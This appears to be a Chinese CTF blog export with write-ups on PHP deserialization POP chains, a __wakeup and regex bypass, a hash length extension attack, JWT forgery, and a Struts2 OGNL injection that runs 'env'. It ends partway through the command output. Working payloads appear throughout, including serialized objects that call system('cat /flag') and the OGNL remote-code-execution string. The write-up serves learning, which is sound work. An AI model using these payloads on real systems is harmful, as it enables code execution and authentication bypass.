class="line"></span><br></pre></td></tr></table></figure><p>首先是正则绕过：&#x2F;[oc]:\d+:&#x2F;i<br>这段正则的意思是匹配所有的以o、c、O、C开头，加冒号:，加数字、再加冒号:的字符串，忽略大小写，也就是o:4:这部分序列化串开头的匹配。这里使用+4绕过，这是因为这样即绕过了这里正则的条件，由不会改变o后面的值，因为+4与4是相同的，不会影响反序列化的结果。<br>其次是wakeup，wakeup只需要把序列化字串的对象属性个数1改为别的数字就行了，但是注意这里file 的类型是private，所以打印出来的串是有不可见字符%00的，不要复制出来自己base，不然结果就不一样了。&lt;?php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Demo</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$file</span> = <span class="string">&#x27;fl4g.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="title class_">Demo</span>();</span><br><span class="line"><span class="variable">$b</span>=<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$b</span>;<span class="comment">//O:4:&quot;Demo&quot;:1:&#123;s:10:&quot;%00Demo file%00&quot;;s:8:&quot;fl4g.php&quot;;&#125;  file私有变量记得加%00</span></span><br><span class="line"><span class="variable">$b</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;O:4&quot;</span>,<span class="string">&quot;O:+4&quot;</span>,<span class="variable">$b</span>);</span><br><span class="line"><span class="variable">$b</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;:1:&quot;</span>,<span class="string">&quot;:2:&quot;</span>,<span class="variable">$b</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">base64_encode</span>(<span class="variable">$b</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">    <span class="comment">//TzorNDoiRGVtbyI6Mjp7czoxMDoiAERlbW8AZmlsZSI7czo4OiJmbDRnLnBocCI7fQ==</span></span><br></pre></td></tr></table></figure><p>###[NISACTF 2022]popchains</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line">Happy New Year~ MAKE A WISH</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;Happy New Year~ MAKE A WISH&lt;br&gt;&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;wish&#x27;</span>]))&#123;</span><br><span class="line">    @<span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;wish&#x27;</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="variable">$a</span>=<span class="keyword">new</span> <span class="title class_">Road_is_Long</span>;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/***************************pop your 2022*****************************/</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Road_is_Long</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$page</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$string</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$file</span>=<span class="string">&#x27;index.php&#x27;</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;page = <span class="variable">$file</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="keyword">string</span>-&gt;page;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/file|ftp|http|https|gopher|dict|\.\./i&quot;</span>, <span class="variable">$this</span>-&gt;page)) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;You can Not Enter 2022&quot;</span>;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;page = <span class="string">&quot;index.php&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Try_Work_Hard</span></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span>  <span class="variable">$var</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">append</span>(<span class="params"><span class="variable">$value</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">include</span>(<span class="variable">$value</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">append</span>(<span class="variable">$this</span>-&gt;<span class="keyword">var</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Make_a_Change</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$effort</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;effort = <span class="keyword">array</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$key</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$function</span> = <span class="variable language_">$this</span>-&gt;effort;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$function</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/**********************Try to See flag.php*****************************/</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>这个题目有一个文件包含读取flag，先捋一下触发顺序</p><p>倒着来的：append-&gt;invoke-&gt;get-&gt;tostring-&gt;construct</p><p>poc链就是</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Road_is_Long</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$page</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$string</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Try_Work_Hard</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$var</span> = <span class="string">&quot;/flag&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Make_a_Change</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$effort</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">Road_is_Long</span>();</span><br><span class="line"><span class="variable">$a</span> -&gt;page=<span class="variable">$a</span>;</span><br><span class="line"><span class="variable">$a</span> -&gt; <span class="keyword">string</span> = <span class="keyword">new</span> <span class="title class_">Make_a_Change</span>();</span><br><span class="line"><span class="variable">$a</span> -&gt; <span class="keyword">string</span> -&gt; effort = <span class="keyword">new</span> <span class="title class_">Try_Work_Hard</span>();</span><br><span class="line"><span class="variable">$b</span> = <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>));</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$b</span>;</span><br></pre></td></tr></table></figure><h3 id="SWPUCTF-2022-新生赛-ez-1zpop"><a href="#SWPUCTF-2022-新生赛-ez-1zpop" class="headerlink" title="[SWPUCTF 2022 新生赛]ez_1zpop"></a>[SWPUCTF 2022 新生赛]ez_1zpop</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">dxg</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">   <span class="function"><span class="keyword">function</span> <span class="title">fmm</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">   </span>&#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="string">&quot;nonono&quot;</span>;</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">lt</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">   <span class="keyword">public</span> <span class="variable">$impo</span>=<span class="string">&#x27;hi&#x27;</span>;</span><br><span class="line">   <span class="keyword">public</span> <span class="variable">$md51</span>=<span class="string">&#x27;weclome&#x27;</span>;</span><br><span class="line">   <span class="keyword">public</span> <span class="variable">$md52</span>=<span class="string">&#x27;to NSS&#x27;</span>;</span><br><span class="line">   <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">   </span>&#123;</span><br><span class="line">      <span class="variable language_">$this</span>-&gt;impo = <span class="keyword">new</span> dxg;</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">   </span>&#123;</span><br><span class="line">      <span class="variable language_">$this</span>-&gt;impo = <span class="keyword">new</span> dxg;</span><br><span class="line">      <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;impo-&gt;<span class="title function_ invoke__">fmm</span>();</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">   </span>&#123;</span><br><span class="line">      <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;impo) &amp;&amp; <span class="title function_ invoke__">md5</span>(<span class="variable">$this</span>-&gt;md51) == <span class="title function_ invoke__">md5</span>(<span class="variable">$this</span>-&gt;md52) &amp;&amp; <span class="variable language_">$this</span>-&gt;md51 != <span class="variable language_">$this</span>-&gt;md52)</span><br><span class="line">         <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;impo-&gt;<span class="title function_ invoke__">fmm</span>();</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">   </span>&#123;</span><br><span class="line">      <span class="keyword">echo</span> <span class="variable language_">$this</span>;</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">fin</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">   <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">   <span class="keyword">public</span> <span class="variable">$url</span> = <span class="string">&#x27;https://www.ctfer.vip&#x27;</span>;</span><br><span class="line">   <span class="keyword">public</span> <span class="variable">$title</span>;</span><br><span class="line">   <span class="function"><span class="keyword">function</span> <span class="title">fmm</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">   </span>&#123;</span><br><span class="line">      <span class="variable">$b</span> = <span class="variable language_">$this</span>-&gt;a;</span><br><span class="line">      <span class="variable">$b</span>(<span class="variable language_">$this</span>-&gt;title);</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;NSS&#x27;</span>])) &#123;</span><br><span class="line">   <span class="variable">$Data</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;NSS&#x27;</span>]);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">   <span class="title function_ invoke__">highlight_file</span>(__file__);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>现找可利用的点</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">fmm</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">   </span>&#123;</span><br><span class="line">      <span class="variable">$b</span> = <span class="variable language_">$this</span>-&gt;a;</span><br><span class="line">      <span class="variable">$b</span>(<span class="variable language_">$this</span>-&gt;title);</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><p>把$b当做函数调用了，$b的值为$this-&gt;a;  命令为（$this-&gt;title);例system()</p><p>可以利用这个，将a的值提前写好为system，title为ls  cat flag啥的</p><p>$b就会被赋值为system，内容为ls</p><p>在it类中触发__wake up，会返回到一个没有用的类里，要绕过一下</p><p>梳理下来，就是construct-&gt;to_string-&gt;destruct</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">lt</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$impo</span> ;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$md51</span> = <span class="string">&#x27;s878926199a&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$md52</span> = <span class="string">&#x27;s155964671a&#x27;</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">fin</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>=<span class="string">&#x27;system&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$url</span> = <span class="string">&#x27;https://www.ctfer.vip&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$title</span>=<span class="string">&#x27;ls /&#x27;</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="title function_ invoke__">lt</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;impo=<span class="keyword">new</span> <span class="title function_ invoke__">fin</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="comment">//O:2:&quot;lt&quot;:3:&#123;s:4:&quot;impo&quot;;O:3:&quot;fin&quot;:3:&#123;s:1:&quot;a&quot;;s:6:&quot;system&quot;;s:3:&quot;url&quot;;s:21:&quot;https://www.ctfer.vip&quot;;s:5:&quot;title&quot;;s:4:&quot;ls /&quot;;&#125;s:4:&quot;md51&quot;;s:11:&quot;s878926199a&quot;;s:4:&quot;md52&quot;;s:11:&quot;s155964671a&quot;;&#125;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><img src="/2023/08/03/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E9%80%83%E9%80%B8/1/hexoblog/source/image/image-20230804203006691-1700990458631-265.png" alt="image-20230804203006691"><p>最终playload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?NSS=O:2:&quot;lt&quot;:4:&#123;s:4:&quot;impo&quot;;O:3:&quot;fin&quot;:3:&#123;s:1:&quot;a&quot;;s:6:&quot;system&quot;;s:3:&quot;url&quot;;s:21:&quot;https://www.ctfer.vip&quot;;s:5:&quot;title&quot;;s:9:&quot;cat /flag&quot;;&#125;s:4:&quot;md51&quot;;s:11:&quot;s878926199a&quot;;s:4:&quot;md52&quot;;s:11:&quot;s155964671a&quot;;&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> unserialize </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Jwt&amp;struts2</title>
      <link href="/2023/07/29/jwtstruts/"/>
      <url>/2023/07/29/jwtstruts/</url>
      
        <content type="html"><![CDATA[<h1 id="ctf–web–jwt2struts"><a href="#ctf–web–jwt2struts" class="headerlink" title="*ctf–web–jwt2struts"></a>*ctf–web–jwt2struts</h1><p>记录一下</p><p>打开发现，猜测为jwt伪造</p><blockquote><p>You are now logged in as user. Try to become admin.</p></blockquote><p>CTRL+U</p><blockquote><p>JWT_key.php</p></blockquote><p>第一个知识点，想办法拿到Jwt伪造的key</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;./secret_key.php&quot;</span>;</span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;./salt.php&quot;</span>;</span><br><span class="line"><span class="comment">//$salt = XXXXXXXXXXXXXX // the salt include 14 characters</span></span><br><span class="line"><span class="comment">//md5($salt.&quot;adminroot&quot;)=e6ccbf12de9d33ec27a5bcfb6a3293df</span></span><br><span class="line">@<span class="variable">$username</span> = <span class="title function_ invoke__">urldecode</span>(<span class="variable">$_POST</span>[<span class="string">&quot;username&quot;</span>]);</span><br><span class="line">@<span class="variable">$password</span> = <span class="title function_ invoke__">urldecode</span>(<span class="variable">$_POST</span>[<span class="string">&quot;password&quot;</span>]);</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="variable">$_COOKIE</span>[<span class="string">&quot;digest&quot;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$username</span> === <span class="string">&quot;admin&quot;</span> &amp;&amp; <span class="variable">$password</span> != <span class="string">&quot;root&quot;</span>) &#123;</span><br><span class="line">         <span class="keyword">if</span> (<span class="variable">$_COOKIE</span>[<span class="string">&quot;digest&quot;</span>] === <span class="title function_ invoke__">md5</span>(<span class="variable">$salt</span>.<span class="variable">$username</span>.<span class="variable">$password</span>)) &#123;</span><br><span class="line">            <span class="keyword">die</span> (<span class="string">&quot;The secret_key is &quot;</span>. <span class="variable">$secret_key</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">die</span> (<span class="string">&quot;Your cookies don&#x27;t match up! STOP HACKING THIS SITE.&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">die</span> (<span class="string">&quot;no no no&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这是一个</p><h2 id="哈希长度扩展攻击"><a href="#哈希长度扩展攻击" class="headerlink" title="哈希长度扩展攻击"></a>哈希长度扩展攻击</h2><p>用工具<a href="https://github.com/bwall/HashPump">hashpump</a></p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$ git <span class="built_in">clone</span> https://github.com/bwall/HashPump.git</span><br><span class="line">$ apt-get install g++ libssl-dev</span><br><span class="line">$ <span class="built_in">cd</span> HashPump</span><br><span class="line">$ make</span><br><span class="line">$ make install</span><br><span class="line">$ ./hashpump</span><br></pre></td></tr></table></figure><blockquote><p>input Signature&#x3D; e6ccbf12de9d33ec27a5bcfb6a3293df  &#x2F;&#x2F;这里填已经有的hash值</p><p>input  Data&#x3D;adminroot  &#x2F;&#x2F;这里填已知的，也就是你要上传的</p><p>input Key&#x3D;14  &#x2F;&#x2F;这里填未知的密文长度，题目给了14</p><p>input Data to Add&#x3D;  abcd &#x2F;&#x2F;这里填你自己要添加的字符串，长度尽量大于2</p></blockquote><p><img src="/2023/07/29/jwtstruts/image/image-20230729211158878-1700990370543-203-1700994565105-177.png"></p><blockquote><p>adminroot\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xb8\x00\x00\x00\x00\x00\x00\x00abcd</p></blockquote><p>把\x替换为%</p><p>因为</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">@<span class="variable">$username</span> = <span class="title function_ invoke__">urldecode</span>(<span class="variable">$_POST</span>[<span class="string">&quot;username&quot;</span>]);</span><br><span class="line">@<span class="variable">$password</span> = <span class="title function_ invoke__">urldecode</span>(<span class="variable">$_POST</span>[<span class="string">&quot;password&quot;</span>]);</span><br></pre></td></tr></table></figure><p>password进行了一次url解码，我们要先提前对它进行一次url编码</p><blockquote><p>root%80%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%b8%00%00%00%00%00%00%00abcd</p></blockquote><p>编码后为</p><blockquote><p>root%2580%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%25b8%2500%2500%2500%2500%2500%2500%2500abcd</p></blockquote><p>payload</p><p><img src="/2023/07/29/jwtstruts/image/image-20230729210104769-1700990370543-206-1700994565105-178.png"></p><p>拿到key</p><blockquote><p>sk-he00lctf3r</p></blockquote><p>抓包原页面拿session</p><p><a href="https://jwt.io/">jwt</a></p><p><img src="/2023/07/29/jwtstruts/image/image-20230729210217434-1700990370543-205-1700994565105-179.png"></p><p>在”your-256-bit-secret”处放入你的key</p><p>修改明文，可以拿到加密后的session</p><p><img src="/2023/07/29/jwtstruts/image/image-20230729210132220-1700990370543-204-1700994565106-180.png"></p><p>修改session放包，发现页面自动跳转到&#x2F;admiiiiiiiiiiin&#x2F;</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;title&gt;do you know struts2?</span><br></pre></td></tr></table></figure><p>看名字可以知道是</p><h2 id="struts2"><a href="#struts2" class="headerlink" title="struts2"></a>struts2</h2><p><a href="https://blog.csdn.net/qq_52527336/article/details/125533839">struts2</a></p><p>flag在环境变量里可以找到，原来的文件…..可能没有，可能没有了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27; + (#_memberAccess[&quot;allowStaticMethodAccess&quot;]=true,#foo=new java.lang.Boolean(&quot;false&quot;) ,#context[&quot;xwork.MethodAccessor.denyMethodExecution&quot;]=#foo,@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(&#x27;env&#x27;).getInputStream())) + &#x27;</span><br></pre></td></tr></table></figure><p>HOSTNAME&#x3D;27102e2d72c4LANGUAGE&#x3D;en_US:enJAVA_HOME&#x3D;&#x2F;opt&#x2F;java&#x2F;openjdkGPG_KEYS&#x3D;05AB33110949707C93A279E3D3EFE6B686867BA6 07E48665A34DCAFAE522E5E6266191C37C037D42 47309207D818FFD8DCD3F83F1931D684307A10A5 541FBE7D8F78B25E055DDEE13C370389288584E7 5C3C5F3E314C866292F359A8F3AD5C94A67F707E 765908099ACF92702C7D949BFA0C35EA8AA299F1 79F7026C690BAA50B92CD8B66A3AD3F4F22C4FED 9BA44C2621385CB966EBA586F72C284D731FABEE A27677289986DB50844682F8ACB77FC2E86E29AC A9C5DF4D22E99998D9875A5110C01C5A2F6059E7 DCFD35E0BF8CA7344752DE8B6FB21E8933C60243 F3A04C595DB5B6A5F1ECA43E3B7BBB100D811BBE 